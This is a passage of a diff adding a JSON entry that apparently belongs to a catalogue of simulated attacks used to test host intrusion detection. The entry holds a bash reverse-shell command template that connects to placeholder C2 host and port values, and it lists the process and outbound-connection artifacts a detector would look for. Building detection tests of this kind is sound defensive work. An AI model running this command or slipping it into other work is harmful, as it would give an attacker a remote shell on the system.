+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "env -i HOME=/tmp PATH=/bin:/usr/bin bash -c 'bash -i >& /dev/tcp/{{C2_HOST}}/{{C2_PORT}} 0>&1'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:bash",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  }
+]
